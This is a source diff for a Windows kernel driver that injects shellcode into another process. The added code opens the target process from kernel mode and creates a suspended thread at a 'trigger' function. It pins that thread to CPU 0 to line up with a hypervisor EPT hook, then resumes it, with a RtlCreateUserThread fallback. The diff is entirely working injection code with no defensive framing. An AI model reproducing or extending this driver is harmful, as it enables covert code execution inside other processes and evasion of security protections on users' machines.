@@ -28,6 +28,9 @@ extern "C" NTSYSAPI NTSTATUS NTAPI ZwProtectVirtualMemory(
     HANDLE ProcessHandle, PVOID * BaseAddress, PSIZE_T RegionSize,
     ULONG NewProtect, PULONG OldProtect);
 
+typedef ULONG (NTAPI * fn_KeResumeThread)(PKTHREAD Thread);
+static fn_KeResumeThread g_pKeResumeThread = NULL;
+
 typedef struct _TD_UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
@@ -1801,13 +1804,82 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         KeUnstackDetachProcess(&apc_state);
 
         //
-        // --- step 9: create thread at trigger function (valid CFG target) ---
+        // --- step 9: create thread at trigger, pin to CPU 0 ---
+        //
+        // trigger hook only on CPU 0's EPT → thread MUST run on CPU 0.
+        // SUSPENDED → set affinity → resume.
         //
         if (NT_SUCCESS(st) && p->shellcode_va)
         {
-            NTSTATUS thr_st = TdCreateThread(proc, trigger_fn);
-            p->actual_size |= ((UINT64)(UINT32)thr_st << 32);
-            DbgPrintEx(0, 0, "[td] inject: thread at trigger=%p st=0x%08X\n", trigger_fn, thr_st);
+            if (g_pZwCreateThreadEx)
+            {
+                // SUSPENDED + pin CPU 0 + resume
+                HANDLE thr_proc_h = NULL;
+                NTSTATUS oh_st = ObOpenObjectByPointer(
+                    proc, OBJ_KERNEL_HANDLE, NULL,
+                    PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &thr_proc_h);
+
+                if (NT_SUCCESS(oh_st))
+                {
+                    HANDLE thr_h = NULL;
+                    NTSTATUS thr_st = g_pZwCreateThreadEx(
+                        &thr_h, THREAD_ALL_ACCESS, NULL, thr_proc_h,
+                        trigger_fn, NULL,
+                        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
+                        0, 0, 0, NULL);
+
+                    if (NT_SUCCESS(thr_st) && thr_h)
+                    {
+                        KAFFINITY cpu0 = (KAFFINITY)1;
+                        ZwSetInformationThread(thr_h, ThreadAffinityMask, &cpu0, sizeof(cpu0));
+
+                        if (g_pZwResumeThread)
+                        {
+                            ULONG prev = 0;
+                            g_pZwResumeThread(thr_h, &prev);
+                        }
+                        else if (g_pKeResumeThread)
+                        {
+                            PETHREAD thr_obj = NULL;
+                            if (NT_SUCCESS(ObReferenceObjectByHandle(thr_h, THREAD_ALL_ACCESS,
+                                    *PsThreadType, KernelMode, (PVOID *)&thr_obj, NULL)))
+                            {
+                                g_pKeResumeThread((PKTHREAD)thr_obj);
+                                ObDereferenceObject(thr_obj);
+                            }
+                        }
+                        DbgPrintEx(0, 0, "[td] inject: thread SUSPENDED+CPU0+RESUMED trigger=%p\n", trigger_fn);
+                        ZwClose(thr_h);
+                    }
+                    else
+                        DbgPrintEx(0, 0, "[td] inject: ZwCreateThreadEx failed: 0x%08X\n", thr_st);
+                    ZwClose(thr_proc_h);
+                }
+            }
+            else
+            {
+                // fallback: pin self to CPU 0, RtlCreateUserThread (not suspended)
+                KAFFINITY old_aff = KeSetSystemAffinityThreadEx((KAFFINITY)1);
+                KAPC_STATE thr_apc;
+                KeStackAttachProcess(proc, &thr_apc);
+
+                HANDLE thr_h = NULL;
+                CLIENT_ID cid = {};
+                NTSTATUS thr_st = RtlCreateUserThread(
+                    ZwCurrentProcess(), NULL, FALSE, 0, 0, 0,
+                    trigger_fn, NULL, &thr_h, &cid);
+
+                if (NT_SUCCESS(thr_st) && thr_h)
+                {
+                    KAFFINITY cpu0 = (KAFFINITY)1;
+                    ZwSetInformationThread(thr_h, ThreadAffinityMask, &cpu0, sizeof(cpu0));
+                    ZwClose(thr_h);
+                }
+
+                KeUnstackDetachProcess(&thr_apc);
+                KeRevertToUserAffinityThreadEx(old_aff);
+                DbgPrintEx(0, 0, "[td] inject: fallback RtlCreateUserThread trigger=%p st=0x%08X\n", trigger_fn, thr_st);
+            }
         }
 
         ObDereferenceObject(proc);
@@ -1914,6 +1986,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
         RtlInitUnicodeString(&fn, L"ZwResumeThread");
         g_pZwResumeThread = (fn_ZwResumeThread)MmGetSystemRoutineAddress(&fn);
     }
+
+    RtlInitUnicodeString(&fn, L"KeResumeThread");
+    g_pKeResumeThread = (fn_KeResumeThread)MmGetSystemRoutineAddress(&fn);
 
     UNICODE_STRING dev_name, sym_name;
     RtlInitUnicodeString(&dev_name, TD_DEVICE_NAME);
